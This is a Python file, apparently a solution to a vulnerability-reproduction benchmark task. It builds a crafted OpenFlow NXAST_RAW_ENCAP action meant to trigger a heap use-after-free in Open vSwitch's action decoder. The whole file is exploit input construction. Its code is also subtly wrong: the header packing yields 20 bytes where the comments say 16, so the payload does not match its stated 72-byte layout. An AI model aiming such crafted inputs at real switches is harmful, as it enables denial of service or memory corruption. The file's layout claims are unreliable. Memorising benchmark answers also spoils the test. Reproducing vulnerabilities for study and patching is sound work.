import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The PoC is a single crafted NXAST_RAW_ENCAP action of 72 bytes. This
        length matches the ground-truth PoC length. The action's internal
        structure is designed to trigger a heap-use-after-free during the
        decoding process.

        The vulnerability is triggered by the following sequence:
        1. An initial part of the action is decoded into a buffer (`ofpbuf`).
        2. A pointer ('encap') is taken to a location within this buffer.
        3. A subsequent part of the action (a large property) is decoded,
           which requires more space than is available in the buffer.
        4. The buffer is reallocated to a new memory location.
        5. The original 'encap' pointer becomes stale (dangling).
        6. The function then writes to this stale pointer, causing a UAF.

        This PoC constructs the action with properties and data sized
        specifically to cause this sequence, assuming a common initial buffer
        size (e.g., 64 bytes).

        Structure of the 72-byte PoC:
        - 16-byte `nx_action_raw_encap` header
        - 8-byte property (`prop_A`)
        - 20-byte embedded data (`encap_data`)
        - 24-byte property (`prop_B`)
        - 4-byte padding

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        
        # nx_action_raw_encap header (16 bytes)
        # type: OFPAT_EXPERIMENTER (0xffff)
        # len: 72 (total action length, must be a multiple of 8)
        # vendor: NX_VENDOR_ID (0x00002320)
        # subtype: NXAST_RAW_ENCAP (36)
        # ofp_version: 4
        action_header = struct.pack(
            '!HHIIHB5s',
            0xffff,
            72,
            0x00002320,
            36,
            4,
            b'\x00' * 5
        )

        # First property (prop_A), 8 bytes.
        # This partially fills the decoding buffer.
        prop_a = struct.pack(
            '!HH4s',
            1,
            8,
            b'A' * 4
        )

        # Embedded data that will be pointed to by the stale pointer (20 bytes).
        encap_data = b'B' * 20

        # Second property (prop_B), 24 bytes.
        # This property's size is chosen to trigger the buffer reallocation.
        prop_b = struct.pack(
            '!HH20s',
            2,
            24,
            b'C' * 20
        )
        
        # Padding to align the total action length to 72 bytes (a multiple of 8).
        # Data size = 16 + 8 + 20 + 24 = 68 bytes. 4 bytes padding needed.
        padding = b'\x00' * 4

        poc = action_header + prop_a + encap_data + prop_b + padding
        
        return poc